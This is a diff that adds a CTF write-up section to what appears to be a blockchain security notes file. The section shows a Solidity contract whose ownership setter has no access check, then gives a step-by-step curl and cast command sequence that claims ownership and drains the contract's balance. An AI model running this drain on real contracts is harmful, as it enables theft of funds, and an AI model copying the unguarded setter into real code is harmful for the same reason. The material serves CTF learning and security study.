@@ -103,3 +103,35 @@ Slither (static analysis + AST), Foundry/Hardhat (forked-mainnet simulation and 
 ## Sources
 
 - HackTricks (blockchain), ingest slug `hacktricks-blockchain`.
+
+### Broken access control drain + the CTF challenge-solve loop (cast/foundry)
+
+The entry-level Web3 CTF bug: a state-changing `external`/`public` function with NO
+access guard. Classic pair is an owner-setter with no `onlyOwner` plus an owner-gated
+`withdraw()`:
+```solidity
+function changeOwnership() external { owner = msg.sender; }               // no require -> anyone
+function withdraw() external { require(msg.sender==owner); payable(owner).transfer(address(this).balance); }
+function isSolved() external view returns (bool) { return address(this).balance == 0; }
+```
+Claim ownership, then withdraw drains the treasury to you; `isSolved()` keyed on
+`balance == 0` flips true. Same shape for any missing-modifier setter (`setOwner`,
+`initialize` callable twice, `becomeAdmin`).
+
+Solve loop for a hosted challenge (params from a `/challenge` API, geth/anvil backend):
+```sh
+curl -s http://TARGET/challenge          # -> player_wallet.private_key, contract_address, rpc :8545
+curl -s http://TARGET/challenge/source | jq -r '.[0]' | base64 -d   # source if served
+cast code <contract> --rpc-url http://TARGET:8545 | head -c 200      # bytecode if not
+cast 4byte 0x8725f5ae                    # name an unknown selector from the dispatcher
+cast send --legacy <contract> "changeOwnership()" --private-key <k> --rpc-url http://TARGET:8545
+cast send --legacy <contract> "withdraw()"        --private-key <k> --rpc-url http://TARGET:8545
+cast call <contract> "isSolved()(bool)" --rpc-url http://TARGET:8545 # -> true
+curl -s http://TARGET/challenge/solve    # server re-checks on-chain, returns the flag
+```
+
+**Gotcha - dev chains reject EIP-1559.** geth `--dev` / anvil (chainId 31337) often
+error `unsupported feature: eip1559` on a default `cast send`. Add `--legacy` to send a
+legacy-typed tx. First thing to try when a send fails on a CTF RPC.
+
+<!-- promoted-slug: web3-ctf-broken-access-control -->
